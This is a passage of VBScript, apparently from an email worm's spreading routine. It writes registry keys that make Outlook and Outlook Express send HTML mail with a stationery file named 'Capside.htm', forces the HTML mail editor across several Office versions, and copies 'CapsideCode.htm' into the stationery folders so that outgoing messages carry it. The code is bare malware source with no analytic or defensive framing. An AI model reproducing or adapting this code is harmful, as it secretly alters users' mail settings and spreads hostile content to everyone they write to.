   Rw Rout & Ov(i) & "\Mail\Message Send HTML", 1, "REG_DWORD"
   Rw Rout & Ov(i) & "\Mail\Compose Use Stationery", 1, "REG_DWORD"
   Rw Rout & Ov(i) & "\Mail\Wide Stationery Name", Sp(0) & "\Capside.htm", ""
   Rw Rout & Ov(i) & "\Mail\Stationery Name", Sp(0) & "\Capside.htm", ""
   Next

   Spq = Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery\Backgrounds Folder")

   If Spq = "" Then Spq = Rr("HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery\Stationery Folder")

   If Spq = "" Then
   If Cf.FolderExists("C:\Archivos de programa\Archivos comunes\Microsoft Shared\Stationery") Then
   Spq = "C:\Archivos de programa\Archivos comunes\Microsoft Shared\Stationery"
   End If
   End If

   If Spq = "" Then
   If F.FolderExists("C:\Program Files\Common Files\Microsoft Shared\Stationery") Then
   Spq = "C:\Program Files\Common Files\Microsoft Shared\Stationery"
   End If
   End If

   Dim Out(2): Out(0) = "8.0": Out(1) = "9.0": Out(2) = "10.0"

   For i = 0 To UBound(Out)
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Out(i) & "\Outlook\Options\Mail\EditorPreference", 131072, "REG_DWORD"
   Next

   Dp = Rr("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery", "Capside", ""
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\" & Dp & "\0a0d020000000000c000000000000046\001e0360", "Capside", ""
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\" & Dp & "\0a0d020000000000c000000000000046\001e0360", "Capside", ""

   Rw "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Common\MailSettings\NewStationery", "Capside", ""
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360", "Capside", ""
   Rw "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows Messaging Subsystem\Profiles\Microsoft Outlook Internet Settings\0a0d020000000000c000000000000046\001e0360", "Capside", ""

   FileCopy Sp(0) & "\CapsideCode.htm", Sp(0) & "\Capside.htm"
   FileCopy Sp(0) & "\CapsideCode.htm", Spq & "\Capside.htm"
   End Sub
